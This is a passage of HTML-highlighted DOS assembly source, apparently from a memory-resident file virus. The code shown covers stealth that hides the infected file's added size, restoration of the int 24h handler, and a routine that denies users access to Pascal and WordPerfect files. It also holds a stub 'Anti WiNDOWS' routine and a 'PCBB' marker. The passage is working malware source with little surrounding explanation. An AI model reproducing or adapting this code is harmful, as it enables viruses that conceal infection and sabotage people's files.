                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">done_stealthing_fcb</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Dh</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Fh</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">done_stealthing_fcb</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">reset_i24</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">o24</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">                </span><span class="sc1">;restore int 24 vector</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">wpbuff</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'   '</span><span class="sc0">
</span><span class="sc1">;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="sc0">
</span><span class="sc1">;                Deny access to any PASCAL or WORD PERFECT files</span><span class="sc0">
</span><span class="sc1">;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="sc0">
</span><span class="sc5">PAS_WP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">search_pas</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">not_pas</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">not_pas</span><span class="sc0">

                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DFDFh</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'P.'</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0DFDFh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">search_pas</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DFDFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SA'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">fuck_wp</span><span class="sc0">
</span><span class="sc5">not_pas</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">not_wp</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">not_wp</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wpbuff</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close_wp</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close_wp</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc5">wpbuff</span><span class="sc4">[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'PW'</span><span class="sc0">

                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close_wp</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">close_wp</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">not_wp</span><span class="sc0">

</span><span class="sc5">fuck_wp</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">reset_i24</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">not_wp</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="sc0">
</span><span class="sc1">;                             Anti WiNDOWS Routine</span><span class="sc0">
</span><span class="sc1">;                     (Just started... Not at all ready!!!)</span><span class="sc0">
</span><span class="sc1">;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="sc0">
</span><span class="sc5">windows</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;                call    push_all</span><span class="sc0">
</span><span class="sc1">;                xchg    cx,ax</span><span class="sc0">
</span><span class="sc1">;                mov     di,dx</span><span class="sc0">
</span><span class="sc1">;                push    ds</span><span class="sc0">
</span><span class="sc1">;                pop     es</span><span class="sc0">
</span><span class="sc1">;                cld</span><span class="sc0">
</span><span class="sc1">;                xor     al,al</span><span class="sc0">
</span><span class="sc1">;winsrc:         repnz   scasb</span><span class="sc0">
</span><span class="sc1">;                jne     win_fail</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                sub     di,8</span><span class="sc0">
</span><span class="sc1">;                xchg    si,di</span><span class="sc0">


</span><span class="sc1">;db 'Eloã, Eloã, lam† sabakt†ni?'</span><span class="sc0">

</span><span class="sc5">dummy</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;3</span><span class="sc0">

</span><span class="sc5">version</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">ver</span><span class="sc0">                          </span><span class="sc1">;\
size            dw (offset total)-100h          ; &gt; 6 bytes</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PCBB'</span><span class="sc0">                                       </span><span class="sc1">;/</span><span class="sc0">

</span><span class="sc5">total</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">tsr_para</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">6</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;equ (($-100h / 16)+2)*2</span><span class="sc0">


</span></div></body>
</html>
